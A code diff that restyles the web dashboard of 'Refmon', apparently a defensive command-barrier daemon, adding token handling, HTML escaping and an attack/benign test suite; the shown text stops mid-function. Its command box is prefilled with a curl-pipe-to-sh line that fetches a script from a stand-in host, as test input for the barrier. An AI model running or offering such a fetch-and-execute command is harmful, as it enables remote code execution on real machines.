@@ -1,8 +1,8 @@
 # ruff: noqa: E501
-"""Self-contained HTML/CSS/JS live visual interface for the Refmon barrier daemon.
+"""Clean, minimal light-theme web interface for the Refmon live barrier daemon.
 
-No external CDN links or third-party assets are loaded so the dashboard works offline on
-isolated cluster nodes and preserves Refmon's strict privacy rules.
+Self-contained HTML/CSS/JS with zero external network assets so it runs offline on shared
+cluster nodes and strictly displays privacy-safe post-Observe telemetry (`hmac:...` only).
 """
 
 from __future__ import annotations
@@ -12,315 +12,480 @@ DASHBOARD_HTML = """<!doctype html>
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Refmon Live Security Barrier &amp; Policy Monitor</title>
+<title>Refmon Policy Monitor</title>
 <style>
 :root {
-  --bg: #0b101b;
-  --panel: #131b2e;
-  --panel-alt: #18233b;
-  --border: #263554;
-  --text: #e6edf7;
-  --muted: #8ea0c0;
-  --allow: #10b981;
-  --hold: #f59e0b;
-  --block: #ef4444;
-  --accent: #38bdf8;
+  --bg: #f6f8fa;
+  --surface: #ffffff;
+  --border: #d8dee4;
+  --border-soft: #eaeef2;
+  --text: #1f2328;
+  --muted: #59636e;
+  --allow-bg: #dafbe1;
+  --allow-fg: #1a7f37;
+  --hold-bg: #fff8c5;
+  --hold-fg: #9a6700;
+  --block-bg: #ffebe9;
+  --block-fg: #cf222e;
+  --neutral-bg: #eef1f4;
+  --neutral-fg: #424a53;
+  --primary: #0969da;
   --mono: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, monospace;
 }
 * { box-sizing: border-box; }
 body {
   margin: 0;
-  font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
   background: var(--bg);
   color: var(--text);
-  font-size: 14px;
+  font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+  font-size: 13.5px;
+  line-height: 1.45;
+}
+.container {
+  max-width: 1440px;
+  margin: 0 auto;
+  padding: 18px 22px 36px;
 }
 header {
+  background: var(--surface);
+  border: 1px solid var(--border);
+  border-radius: 8px;
+  padding: 14px 18px;
+  margin-bottom: 16px;
   display: flex;
   flex-wrap: wrap;
-  align-items: center;
   justify-content: space-between;
+  align-items: center;
   gap: 12px;
-  padding: 14px 20px;
-  background: var(--panel);
-  border-bottom: 1px solid var(--border);
 }
-.brand { display: flex; align-items: center; gap: 12px; }
-.pulse {
-  width: 11px; height: 11px; border-radius: 50%;
-  background: var(--allow);
-  box-shadow: 0 0 10px var(--allow);
+h1 { margin: 0; font-size: 18px; font-weight: 600; color: var(--text); }
+.subtitle { color: var(--muted); font-size: 12px; font-family: var(--mono); margin-top: 2px; }
+.summary-strip {
+  display: flex;
+  flex-wrap: wrap;
+  gap: 8px;
 }
-h1 { margin: 0; font-size: 18px; font-weight: 700; letter-spacing: 0.2px; }
-.sub { color: var(--muted); font-size: 12px; font-family: var(--mono); }
-.stats { display: flex; flex-wrap: wrap; gap: 10px; align-items: center; }
-.stat {
-  background: var(--panel-alt);
+.metric {
+  border: 1px solid var(--border);
+  background: #fafbfc;
+  border-radius: 6px;
+  padding: 6px 12px;
+  min-width: 96px;
+}
+.metric .k { font-size: 11px; color: var(--muted); }
+.metric .v { font-size: 15px; font-weight: 600; font-family: var(--mono); }
+
+.top-grid {
+  display: grid;
+  grid-template-columns: 1.35fr 1fr 1fr;
+  gap: 14px;
+  margin-bottom: 16px;
+}
+@media (max-width: 1150px) {
+  .top-grid { grid-template-columns: 1fr; }
+}
+.panel {
+  background: var(--surface);
   border: 1px solid var(--border);
   border-radius: 8px;
-  padding: 6px 12px;
-  text-align: center;
+  padding: 14px 16px;
 }
-.stat .k { font-size: 11px; color: var(--muted); text-transform: uppercase; }
-.stat .v { font-size: 16px; font-weight: 700; font-family: var(--mono); }
-.grid {
-  display: grid;
-  grid-template-columns: 340px 1fr 360px;
-  gap: 14px;
-  padding: 14px;
-  min-height: calc(100vh - 70px);
-}
-@media (max-width: 1280px) {
-  .grid { grid-template-columns: 1fr; }
-}
-.card {
-  background: var(--panel);
-  border: 1px solid var(--border);
-  border-radius: 10px;
-  padding: 14px;
-  margin-bottom: 14px;
-}
-.card h2 {
+.panel h2 {
   margin: 0 0 10px 0;
   font-size: 14px;
-  text-transform: uppercase;
-  letter-spacing: 0.5px;
-  color: var(--accent);
+  font-weight: 600;
+  color: var(--text);
+  border-bottom: 1px solid var(--border-soft);
+  padding-bottom: 7px;
 }
-label { display: block; font-size: 12px; color: var(--muted); margin: 8px 0 4px; }
+.muted { color: var(--muted); font-size: 12px; }
+.mono { font-family: var(--mono); font-size: 12px; }
+
+label {
+  display: block;
+  font-size: 12px;
+  font-weight: 500;
+  color: var(--muted);
+  margin: 8px 0 3px;
+}
 input, select, textarea {
   width: 100%;
-  background: #0d1424;
+  background: #ffffff;
   color: var(--text);
   border: 1px solid var(--border);
   border-radius: 6px;
-  padding: 8px;
+  padding: 6px 8px;
   font-family: var(--mono);
   font-size: 12px;
 }
-textarea { min-height: 62px; resize: vertical; }
+textarea { min-height: 54px; resize: vertical; }
+
 button {
   cursor: pointer;
-  background: #1e2f4f;
+  background: #f6f8fa;
   color: var(--text);
-  border: 1px solid #355082;
+  border: 1px solid var(--border);
   border-radius: 6px;
-  padding: 7px 11px;
+  padding: 6px 10px;
   font-size: 12px;
+  font-weight: 500;
+}
+button:hover { background: #eaeef2; }
+button.primary {
+  background: var(--primary);
+  color: #ffffff;
+  border-color: var(--primary);
+}
+button.primary:hover { background: #0858b9; }
+button.active-mode {
+  background: #1f2328;
+  color: #ffffff;
+  border-color: #1f2328;
+}
+
+.group-title {
+  font-size: 11px;
   font-weight: 600;
-  transition: background 0.15s;
-}
-button:hover { background: #29416d; }
-button.primary { background: #0284c7; border-color: #38bdf8; }
-button.primary:hover { background: #0369a1; }
-button.danger { background: #991b1b; border-color: #ef4444; }
-button.ok { background: #065f46; border-color: #10b981; }
-.preset-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 6px; margin-top: 8px; }
-.badge {
-  display: inline-block;
-  padding: 2px 8px;
-  border-radius: 999px;
-  font-size: 11px;
-  font-weight: 700;
-  font-family: var(--mono);
-  text-transform: uppercase;
-}
-.badge.allow { background: rgba(16,185,129,0.18); color: #34d399; border: 1px solid #10b981; }
-.badge.hold { background: rgba(245,158,11,0.18); color: #fbbf24; border: 1px solid #f59e0b; }
-.badge.block { background: rgba(239,68,68,0.2); color: #f87171; border: 1px solid #ef4444; }
-.qpill {
-  display: inline-block;
-  padding: 2px 7px;
-  border-radius: 4px;
-  font-size: 11px;
-  margin-right: 4px;
-  font-family: var(--mono);
-}
-.qpill.fail { background: rgba(239,68,68,0.22); color: #fca5a5; }
-.qpill.pass { background: rgba(16,185,129,0.12); color: #6ee7b7; }
-.story {
-  background: var(--panel-alt);
-  border: 1px solid var(--border);
-  border-radius: 8px;
-  padding: 11px;
-  margin-bottom: 10px;
-}
-.story-head { display: flex; justify-content: space-between; align-items: center; gap: 8px; }
-.meter {
-  position: relative;
-  height: 10px;
-  background: #0b101b;
-  border: 1px solid var(--border);
-  border-radius: 5px;
+  color: var(--muted);
   margin: 8px 0 4px;
-  overflow: hidden;
+  text-transform: uppercase;
+  letter-spacing: 0.3px;
 }
-.meter-fill { height: 100%; transition: width 0.25s; }
-.mono { font-family: var(--mono); font-size: 12px; }
-.muted { color: var(--muted); font-size: 12px; }
-.logbox {
-  background: #080c16;
+.btn-wrap {
+  display: flex;
+  flex-wrap: wrap;
+  gap: 5px;
+}
+.btn-sm { padding: 4px 8px; font-size: 11.5px; }
+
+.notice {
+  margin-top: 8px;
+  padding: 8px 10px;
+  border-radius: 6px;
+  border: 1px solid var(--border);
+  background: #f6f8fa;
+  font-size: 12px;
+}
+
+.tag {
+  display: inline-block;
+  padding: 1px 7px;
+  border-radius: 12px;
+  font-size: 11px;
+  font-weight: 600;
+  font-family: var(--mono);
+}
+.tag.allow, .tag.pass { background: var(--allow-bg); color: var(--allow-fg); }
+.tag.hold { background: var(--hold-bg); color: var(--hold-fg); }
+.tag.block, .tag.fail { background: var(--block-bg); color: var(--block-fg); }
+.tag.neutral { background: var(--neutral-bg); color: var(--neutral-fg); }
+
+.q-line { display: flex; flex-wrap: wrap; gap: 4px; margin-bottom: 4px; }
+.q-chip {
+  font-size: 11px;
+  font-family: var(--mono);
+  padding: 1px 6px;
+  border-radius: 4px;
+  border: 1px solid var(--border);
+}
+.q-chip.qfail { background: var(--block-bg); color: var(--block-fg); border-color: #ffcecb; }
+.q-chip.qok { background: #f6f8fa; color: var(--muted); }
+
+table {
+  width: 100%;
+  border-collapse: collapse;
+  font-size: 12.5px;
+}
+th {
+  text-align: left;
+  font-weight: 600;
+  color: var(--muted);
+  background: #f6f8fa;
+  border-bottom: 1px solid var(--border);
+  padding: 8px 10px;
+  font-size: 11.5px;
+}
+td {
+  vertical-align: top;
+  border-bottom: 1px solid var(--border-soft);
+  padding: 9px 10px;
+}
+tr:hover td { background: #fafbfc; }
+
+.kv-row {
+  display: flex;
+  justify-content: space-between;
+  padding: 3px 0;
+  border-bottom: 1px solid var(--border-soft);
+  font-size: 12px;
+}
+.log-grid {
+  display: grid;
+  grid-template-columns: 1fr 1fr;
+  gap: 14px;
+  margin-top: 16px;
+}
+@media (max-width: 980px) {
+  .log-grid { grid-template-columns: 1fr; }
+}
+pre.logbox {
+  margin: 0;
+  background: #f6f8fa;
   border: 1px solid var(--border);
   border-radius: 6px;
   padding: 10px;
   font-family: var(--mono);
   font-size: 11.5px;
-  max-height: 270px;
+  max-height: 220px;
   overflow-y: auto;
   white-space: pre-wrap;
   word-break: break-all;
 }
-.kv { display: flex; justify-content: space-between; padding: 4px 0; border-bottom: 1px solid #1e2b45; font-size: 12px; }
-.banner {
-  margin-top: 8px;
-  padding: 8px 10px;
-  border-radius: 6px;
-  font-size: 12px;
-  font-family: var(--mono);
-  background: #0d1526;
-  border: 1px solid var(--border);
+details summary {
+  cursor: pointer;
+  font-weight: 600;
+  font-size: 13px;
+  padding: 4px 0;
 }
 </style>
 </head>
 <body>
-<header>
-  <div class="brand">
-    <div class="pulse" id="pulse"></div>
+<div class="container">
+  <header>
     <div>
-      <h1>Refmon Live Barrier &amp; Policy Monitor</h1>
-      <div class="sub" id="sandbox-path">loading workspace...</div>
+      <h1>Refmon Live Security Barrier &amp; Policy Monitor</h1>
+      <div class="subtitle" id="hdr-paths">Loading workspace...</div>
     </div>
-  </div>
-  <div class="stats">
-    <div class="stat"><div class="k">Policy Sign</div><div class="v" id="st-sig">...</div></div>
-    <div class="stat"><div class="k">Mode</div><div class="v" id="st-mode">BLOCK</div></div>
-    <div class="stat"><div class="k">Events</div><div class="v" id="st-events">0</div></div>
-    <div class="stat"><div class="k">Blocked</div><div class="v" id="st-blocked" style="color:#f87171">0</div></div>
-    <div class="stat"><div class="k">Holds</div><div class="v" id="st-holds" style="color:#fbbf24">0</div></div>
-    <div class="stat"><div class="k">Quarantined</div><div class="v" id="st-quar" style="color:#38bdf8">0</div></div>
-    <div class="stat"><div class="k">Rootkit</div><div class="v" id="st-rk">ALLOW</div></div>
-  </div>
-</header>
+    <div class="summary-strip">
+      <div class="metric"><div class="k">Policy Signature</div><div class="v" id="m-sig">...</div></div>
+      <div class="metric"><div class="k">Active Mode</div><div class="v" id="m-mode">BLOCK</div></div>
+      <div class="metric"><div class="k">Analysis Checks</div><div class="v" id="m-eval">0 / 0</div></div>
+      <div class="metric"><div class="k">Observed Events</div><div class="v" id="m-events">0</div></div>
+      <div class="metric"><div class="k">Blocked</div><div class="v" id="m-blocked">0</div></div>
+      <div class="metric"><div class="k">Pending Holds</div><div class="v" id="m-holds">0</div></div>
+      <div class="metric"><div class="k">Quarantined</div><div class="v" id="m-quar">0</div></div>
+      <div class="metric"><div class="k">Rootkit Scan</div><div class="v" id="m-rk">ALLOW</div></div>
+    </div>
+  </header>
 
-<div class="grid">
-  <div>
-    <div class="card">
-      <h2>1. Live User Command Barrier</h2>
-      <div class="muted">Test as if a user pasted or typed a command. Dangerous commands are intercepted and stopped before execution.</div>
-      <label>Origin Channel</label>
-      <select id="cmd-origin">
-        <option value="web">web (Browser / ClickFix paste)</option>
-        <option value="mail">mail (Copied from email)</option>
-        <option value="agent_input">agent_input (AI tool command)</option>
-        <option value="none">none (Typed directly by user)</option>
-      </select>
-      <label>Actor Role</label>
-      <select id="cmd-role">
-        <option value="interactive_shell">interactive_shell</option>
-        <option value="web_worker">web_worker</option>
-        <option value="agent">agent</option>
-        <option value="package_installer">package_installer</option>
-      </select>
-      <label>Command to Check &amp; Guard</label>
+  <div class="top-grid">
+    <!-- Panel 1: Attack & Control Suite -->
+    <div class="panel">
+      <div style="display:flex; justify-content:space-between; align-items:center; border-bottom:1px solid var(--border-soft); padding-bottom:7px; margin-bottom:8px;">
+        <h2 style="border:none; padding:0; margin:0;">1. Attack &amp; Benign Test Suite</h2>
+        <button class="primary" onclick="runFullSuite()">Run All 16 Scenarios</button>
+      </div>
+      <div id="preset-groups">Loading scenarios...</div>
+      <div style="margin-top:10px; padding-top:8px; border-top:1px solid var(--border-soft); display:flex; gap:6px; align-items:center;">
+        <span class="muted" style="white-space:nowrap;">Golden Scenario (S01-S50):</span>
+        <input id="golden-id" value="S01" style="max-width:90px;">
+        <button class="btn-sm" onclick="runGolden()">Replay</button>
+      </div>
+      <div id="suite-banner" class="notice" style="display:none;"></div>
+    </div>
+
+    <!-- Panel 2: Custom Command Barrier -->
+    <div class="panel">
+      <h2>2. Custom Command Barrier</h2>
+      <div class="muted">Test any pasted or typed command against the active signed policy.</div>
+      <div style="display:grid; grid-template-columns:1fr 1fr; gap:8px;">
+        <div>
+          <label>Origin Source</label>
+          <select id="cmd-origin">
+            <option value="web">web (Browser paste)</option>
+            <option value="mail">mail (Email copy)</option>
+            <option value="agent_input">agent_input (AI tool)</option>
+            <option value="inbound_request">inbound_request (HTTP)</option>
+            <option value="download">download (File)</option>
+            <option value="none">none (Typed locally)</option>
+          </select>
+        </div>
+        <div>
+          <label>Process Role</label>
+          <select id="cmd-role">
+            <option value="interactive_shell">interactive_shell</option>
+            <option value="web_worker">web_worker</option>
+            <option value="agent">agent</option>
+            <option value="package_installer">package_installer</option>
+          </select>
+        </div>
+      </div>
+      <label>Command</label>
       <textarea id="cmd-text">curl -s http://bad.example.invalid/fix.sh | sh</textarea>
-      <div style="margin-top:8px; display:flex; gap:8px;">
-        <button class="primary" onclick="submitCommand()" style="flex:1">Send Through Barrier</button>
+      <div style="margin-top:8px;">
+        <button class="primary" onclick="submitCommand()" style="width:100%;">Check Command Through Barrier</button>
       </div>
-      <div id="last-result" class="banner" style="display:none"></div>
+      <div id="cmd-banner" class="notice" style="display:none;"></div>
     </div>
 
-    <div class="card">
-      <h2>2. One-Click Attack &amp; Benign Presets</h2>
-      <div class="muted">Trigger realistic attacks (including real sandbox files) or benign work:</div>
-      <div class="preset-grid">
-        <button class="danger" onclick="runPreset('clickfix')">ClickFix Paste Lure</button>
-        <button class="danger" onclick="runPreset('rce')">Server Web RCE</button>
-        <button class="danger" onclick="runPreset('webshell')">Drop Web Shell File</button>
-        <button class="danger" onclick="runPreset('ransomware')">Ransomware 55 Files</button>
-        <button class="danger" onclick="runPreset('canary')">Touch Canary Secret</button>
-        <button onclick="runPreset('borderline')">Typed Fetch (HOLD)</button>
-        <button class="ok" onclick="runPreset('benign_cmd')">Benign Local Command</button>
-        <button class="ok" onclick="runPreset('benign_doc')">Pasted Local Echo</button>
+    <!-- Panel 3: Signed Policy, Holds, Quarantine & Rootkit -->
+    <div class="panel">
+      <h2>3. Signed Policy, Holds &amp; Host Integrity</h2>
+      <div style="display:flex; gap:6px; margin-bottom:8px;">
+        <button id="btn-mode-block" onclick="setMode('block')" style="flex:1;">Mode: Block</button>
+        <button id="btn-mode-warn" onclick="setMode('warn')" style="flex:1;">Mode: Warn</button>
+        <button id="btn-mode-observe" onclick="setMode('observe')" style="flex:1;">Mode: Observe</button>
       </div>
-      <label style="margin-top:12px">Replay Golden Scenario (S01 - S50)</label>
-      <div style="display:flex; gap:6px;">
-        <input id="golden-id" value="S01" placeholder="e.g. S01, S13, S19, S23">
-        <button onclick="runGolden()">Replay</button>
-      </div>
-    </div>
+      <div id="policy-kv"></div>
 
-    <div class="card">
-      <h2>3. Pending Holds (Human-in-the-Loop)</h2>
-      <div id="holds-box" class="muted">No pending holds.</div>
+      <div style="margin-top:10px;">
+        <div style="display:flex; justify-content:space-between; align-items:center;">
+          <strong style="font-size:12px;">Rootkit Scanner (6 Read-Only Engines)</strong>
+          <button class="btn-sm" onclick="scanRootkit()">Scan Now</button>
+        </div>
+        <div id="rk-summary" class="muted mono" style="margin-top:3px;"></div>
+      </div>
+
+      <div style="margin-top:10px;">
+        <strong style="font-size:12px;">Pending Holds (Human Decision)</strong>
+        <div id="holds-list" class="muted" style="margin-top:3px;">None</div>
+      </div>
+
+      <div style="margin-top:8px;">
+        <strong style="font-size:12px;">Quarantined Files</strong>
+        <div id="quar-list" class="muted mono" style="margin-top:3px;">Empty</div>
+      </div>
     </div>
   </div>
 
-  <div>
-    <div class="card">
-      <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:8px;">
-        <h2 style="margin:0">Live Stories, 3-Question Verdicts &amp; Evidence Math (nats)</h2>
-        <button onclick="scanRootkit()">Run 6-Engine Rootkit Scan Now</button>
+  <!-- Main Table: Live Incident & Analysis Ledger -->
+  <div class="panel">
+    <div style="display:flex; flex-wrap:wrap; justify-content:space-between; align-items:center; gap:10px; margin-bottom:10px;">
+      <h2 style="border:none; padding:0; margin:0;">Live Pipeline Analysis &amp; Verdicts (Privacy-Safe Telemetry)</h2>
+      <div class="btn-wrap">
+        <button class="btn-sm" onclick="setFilter('all')" id="flt-all">All</button>
+        <button class="btn-sm" onclick="setFilter('attack')" id="flt-attack">Attacks</button>
+        <button class="btn-sm" onclick="setFilter('hold')" id="flt-hold">Holds</button>
+        <button class="btn-sm" onclick="setFilter('benign')" id="flt-benign">Benign</button>
       </div>
-      <div id="stories-box" class="muted">Waiting for events...</div>
     </div>
-
-    <div class="card">
-      <h2>Live Barrier Log Stream (barrier.log)</h2>
-      <div class="logbox" id="barrier-log">Loading log stream...</div>
-    </div>
-
-    <div class="card">
-      <h2>Privacy-Verified Event Ledger (events.jsonl — HMAC Only)</h2>
-      <div class="logbox" id="events-log">No observed events yet.</div>
+    <div style="overflow-x:auto;">
+      <table>
+        <thead>
+          <tr>
+            <th style="width:110px;">Story &amp; Time</th>
+            <th style="width:200px;">Attack / Input Type</th>
+            <th style="width:175px;">Verdict &amp; Check Status</th>
+            <th style="width:210px;">3-Question Analysis</th>
+            <th style="width:230px;">Evidence Math (nats)</th>
+            <th>Safe Telemetry &amp; Plain-English Explanation</th>
+          </tr>
+        </thead>
+        <tbody id="stories-tbody">
+          <tr><td colspan="6" class="muted">No events analyzed yet. Click "Run All 16 Scenarios" above or run a test command.</td></tr>
+        </tbody>
+      </table>
     </div>
   </div>
 
-  <div>
-    <div class="card">
-      <h2>Active Signed Policy &amp; Mode</h2>
-      <div style="display:flex; gap:6px; margin-bottom:10px;">
-        <button onclick="setMode('block')" class="danger" style="flex:1">Mode: BLOCK</button>
-        <button onclick="setMode('warn')" style="flex:1">Mode: WARN</button>
-        <button onclick="setMode('observe')" style="flex:1">Mode: OBSERVE</button>
-      </div>
-      <div id="policy-meta"></div>
+  <!-- Live Logs & Contracts -->
+  <div class="log-grid">
+    <div class="panel">
+      <h2>Live Audit Log (barrier.log)</h2>
+      <pre class="logbox" id="barrier-log">Waiting...</pre>
     </div>
+    <div class="panel">
+      <h2>Post-Observe Event Ledger (events.jsonl — HMAC Fingerprints Only)</h2>
+      <pre class="logbox" id="events-log">No observed events yet.</pre>
+    </div>
+  </div>
 
-    <div class="card">
-      <h2>Quarantined Sandbox Files</h2>
-      <div id="quarantine-box" class="muted">Quarantine folder is empty.</div>
-    </div>
-
-    <div class="card">
-      <h2>Rootkit Scanner Details</h2>
-      <div id="rootkit-box" class="mono muted">Not scanned yet.</div>
-    </div>
-
-    <div class="card">
-      <h2>Role Contracts Enforced</h2>
-      <div id="contracts-box" class="mono muted" style="max-height:260px; overflow-y:auto;"></div>
-    </div>
+  <div class="panel" style="margin-top:14px;">
+    <details>
+      <summary>View Active Signed Role Contracts &amp; Protected Assets</summary>
+      <div id="contracts-box" class="mono muted" style="margin-top:8px;"></div>
+    </details>
   </div>
 </div>
 
 <script>
+let currentFilter = 'all';
+let presetsRendered = false;
+
+// The API token comes from the URL fragment printed by `refmon serve` (a fragment is never sent
+// to a server or in a Referer); it is kept for this tab only and removed from the address bar.
+const TOKEN = (() => {
+  const fromHash = new URLSearchParams(location.hash.slice(1)).get('token');
+  try {
+    if (fromHash) { sessionStorage.setItem('refmonToken', fromHash); }
+    return fromHash || sessionStorage.getItem('refmonToken') || '';
+  } catch (e) { return fromHash || ''; }
+  finally { if (fromHash) history.replaceState(null, '', location.pathname); }
+})();
+
 async function api(path, body) {
+  const headers = {'X-Refmon-Token': TOKEN};
   const opts = body !== undefined
-    ? {method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(body)}
-    : {method: 'GET'};
+    ? {method: 'POST', headers: {...headers, 'Content-Type': 'application/json'}, body: JSON.stringify(body)}
+    : {method: 'GET', headers};
   const r = await fetch(path, opts);
+  if (r.status === 401) { throw new Error('API token missing: open the URL printed by refmon serve'); }
   return await r.json();
 }
 
-function natsPercent(lo) {
-  const clamped = Math.max(-8.0, Math.min(2.0, lo));
-  return ((clamped + 8.0) / 10.0) * 100.0;
+function esc(val) {
+  return String(val ?? '')
+    .replace(/&/g, '&amp;')
+    .replace(/</g, '&lt;')
+    .replace(/>/g, '&gt;')
+    .replace(/"/g, '&quot;');
 }
 
-function decisionColor(d) {
-  if (d === 'block') return '#ef4444';
-  if (d === 'hold') return '#f59e0b';
-  return '#10b981';
+function setFilter(f) {
+  currentFilter = f;
+  refresh();
+}
+
+function renderPresets(presets) {
+  if (presetsRendered || !presets || !presets.length) return;
+  presetsRendered = true;
+  const groups = {};
+  for (const p of presets) {
+    if (!groups[p.group]) groups[p.group] = [];
+    groups[p.group].push(p);
+  }
+  const box = document.getElementById('preset-groups');
+  box.innerHTML = Object.entries(groups).map(([gName, items]) => `
+    <div class="group-title">${esc(gName)}</div>
+    <div class="btn-wrap">
+      ${items.map(it => `<button class="btn-sm" onclick="runPreset('${esc(it.id)}')">${esc(it.label)}</button>`).join('')}
+    </div>
+  `).join('');
+}
+
+async function runPreset(name) {
+  const res = await api('/api/preset', {name});
+  const b = document.getElementById('suite-banner');
+  b.style.display = 'block';
+  const match = res.expected ? (res.decision === res.expected ? 'PASS' : 'MISMATCH') : '';
+  b.innerHTML = `<strong>${esc(name)}</strong> &rarr; Verdict: <strong>${esc(res.decision).toUpperCase()}</strong> `
+    + (match ? `(Expected ${esc(res.expected).toUpperCase()}: <strong>${match}</strong>) ` : '')
+    + `| L = ${esc(res.log_odds)} nats. ${esc(res.note || '')}`;
+  await refresh();
+}
+
+async function runFullSuite() {
+  const b = document.getElementById('suite-banner');
+  b.style.display = 'block';
+  b.textContent = 'Running all 16 attack & benign scenarios...';
+  const res = await api('/api/run_suite', {});
+  b.innerHTML = `<strong>Suite Complete:</strong> ${res.passed} / ${res.total} scenarios matched expected policy verdicts `
+    + `(${res.failed} mismatches). Inspect every row in the table below.`;
+  await refresh();
+}
+
+async function runGolden() {
+  const scenario = document.getElementById('golden-id').value.trim();
+  const res = await api('/api/golden', {scenario});
+  const b = document.getElementById('suite-banner');
+  b.style.display = 'block';
+  if (res.error) {
+    b.textContent = res.error;
+  } else {
+    b.innerHTML = `<strong>${esc(res.scenario)}</strong> &rarr; ${esc(res.decision).toUpperCase()} `
+      + `(expected ${esc(res.expected).toUpperCase()}, check=${res.passed ? 'PASS' : 'MISMATCH'}, L=${res.log_odds} nats)`;
+  }
+  await refresh();
 }
 
 async function submitCommand() {
@@ -328,34 +493,12 @@ async function submitCommand() {
   const role = document.getElementById('cmd-role').value;
   const command = document.getElementById('cmd-text').value;
   const res = await api('/api/guard', {command, origin, role, execute: true});
-  const box = document.getElementById('last-result');
-  box.style.display = 'block';
-  box.innerHTML = `<strong>Barrier Verdict: ${res.decision.toUpperCase()}</strong> `
-    + `(L = ${res.log_odds} nats, executed=${res.executed})<br>`
-    + (res.explanation || '') + (res.output ? `<br>Output: ${res.output}` : '');
-  await refresh();
-}
-
-async function runPreset(name) {
-  const res = await api('/api/preset', {name});
-  const box = document.getElementById('last-result');
-  box.style.display = 'block';
-  box.innerHTML = `<strong>Preset '${name}': ${res.decision.toUpperCase()}</strong> `
-    + `(L = ${res.log_odds} nats)<br>${res.note || ''}`;
-  await refresh();
-}
-
-async function runGolden() {
-  const scenario = document.getElementById('golden-id').value.trim();
-  const res = await api('/api/golden', {scenario});
-  const box = document.getElementById('last-result');
-  box.style.display = 'block';
-  if (res.error) {
-    box.textContent = res.error;
-  } else {
-    box.innerHTML = `<strong>Golden ${res.scenario}: ${res.decision.toUpperCase()}</strong> `
-      + `(expected ${res.expected.toUpperCase()}, L = ${res.log_odds} nats)`;
-  }
+  const b = document.getElementById('cmd-banner');
+  b.style.display = 'block';
+  b.innerHTML = `<strong>Verdict: ${esc(res.decision).toUpperCase()}</strong> `
+    + `(L = ${esc(res.log_odds)} nats, executed = ${esc(res.executed)})<br>`
+    + `${esc(res.explanation || '')}`
+    + (res.output ? `<br><span class="mono">stdout: ${esc(res.output)}</span>` : '');
   await refresh();
 }
 
@@ -377,98 +520,134 @@ async function scanRootkit() {
 async function refresh() {
   try {
     const st = await api('/api/state');
-    document.getElementById('sandbox-path').textContent =
-      `Sandbox: ${st.sandbox_dir}  |  Policy: ${st.policy_path}`;
-    document.getElementById('st-sig').textContent = st.policy.signature_ok ? 'VERIFIED' : 'UNSIGNED';
-    document.getElementById('st-mode').textContent = st.policy.mode.toUpperCase();
-    document.getElementById('st-events').textContent = st.counts.events;
-    document.getElementById('st-blocked').textContent = st.counts.blocked;
-    document.getElementById('st-holds').textContent = st.counts.pending_holds;
-    document.getElementById('st-quar').textContent = st.quarantined.length;
-    document.getElementById('st-rk').textContent = st.rootkit.calculus_decision.toUpperCase();
-    document.getElementById('st-rk').style.color = decisionColor(st.rootkit.calculus_decision);
+    renderPresets(st.presets);
 
-    // Holds
-    const hbox = document.getElementById('holds-box');
+    document.getElementById('hdr-paths').textContent =
+      `Workspace: ${st.sandbox_dir}  |  Signed Policy: ${st.policy_path}`;
+    document.getElementById('m-sig').textContent = st.policy.signature_ok ? 'VERIFIED' : 'UNSIGNED';
+    document.getElementById('m-mode').textContent = st.policy.mode.toUpperCase();
+    document.getElementById('m-eval').textContent =
+      st.counts.evaluated ? `${st.counts.eval_passed}/${st.counts.evaluated} PASS` : '—';
+    document.getElementById('m-events').textContent = st.counts.events;
+    document.getElementById('m-blocked').textContent = st.counts.blocked;
+    document.getElementById('m-holds').textContent = st.counts.pending_holds;
+    document.getElementById('m-quar').textContent = st.quarantined.length;
+    document.getElementById('m-rk').textContent = st.rootkit.calculus_decision.toUpperCase();
+
+    for (const m of ['block', 'warn', 'observe']) {
+      const btn = document.getElementById('btn-mode-' + m);
+      if (btn) btn.className = (st.policy.mode === m) ? 'active-mode' : '';
+    }
+    for (const f of ['all', 'attack', 'hold', 'benign']) {
+      const fb = document.getElementById('flt-' + f);
+      if (fb) fb.className = (currentFilter === f) ? 'btn-sm active-mode' : 'btn-sm';
+    }
+
+    document.getElementById('policy-kv').innerHTML = `
+      <div class="kv-row"><span>Ed25519 Digest</span><span class="mono">${esc(st.policy.digest.slice(0, 20))}...</span></div>
+      <div class="kv-row"><span>Prior / Hold / Block (nats)</span><span class="mono">${st.policy.prior_lo} / ${st.policy.hold_thr} / ${st.policy.block_thr}</span></div>
+      <div class="kv-row"><span>Canaries</span><span class="mono">${esc(st.policy.canaries.join(', '))}</span></div>
+    `;
+
+    const rk = st.rootkit;
+    document.getElementById('rk-summary').innerHTML =
+      `Decision: <strong>${esc(rk.calculus_decision).toUpperCase()}</strong> | `
+      + `L=${rk.log_odds} nats | findings=${rk.findings.length} | `
+      + `modules=${rk.kernel_modules_checked}, procs=${rk.own_processes_inspected}`;
+
+    const hbox = document.getElementById('holds-list');
     if (!st.holds.length) {
-      hbox.innerHTML = '<span class="muted">No pending holds.</span>';
+      hbox.textContent = 'No pending holds.';
     } else {
       hbox.innerHTML = st.holds.map(h => `
-        <div class="story">
-          <div class="mono"><strong>${h.hold_id}</strong> (${h.platform}) · story ${h.story_id}</div>
-          <div style="margin-top:6px; display:flex; gap:6px;">
-            <button class="danger" onclick="resolveHold('${h.hold_id}','${h.platform}','${h.platform === 'server' ? 'confirm' : 'stop'}')">Stop &amp; Contain</button>
-            <button class="ok" onclick="resolveHold('${h.hold_id}','${h.platform}','${h.platform === 'server' ? 'release' : 'continue'}')">Release</button>
+        <div style="margin-top:4px; padding:6px; border:1px solid var(--border); border-radius:6px;">
+          <span class="mono"><strong>${esc(h.hold_id)}</strong> (${esc(h.platform)}, ${esc(h.story_id)})</span>
+          <div style="margin-top:4px; display:flex; gap:5px;">
+            <button class="btn-sm" onclick="resolveHold('${esc(h.hold_id)}','${esc(h.platform)}','${h.platform === 'server' ? 'confirm' : 'stop'}')">Stop &amp; Block</button>
+            <button class="btn-sm" onclick="resolveHold('${esc(h.hold_id)}','${esc(h.platform)}','${h.platform === 'server' ? 'release' : 'continue'}')">Release</button>
           </div>
         </div>
       `).join('');
     }
 
-    // Stories
-    const sbox = document.getElementById('stories-box');
-    if (!st.stories.length) {
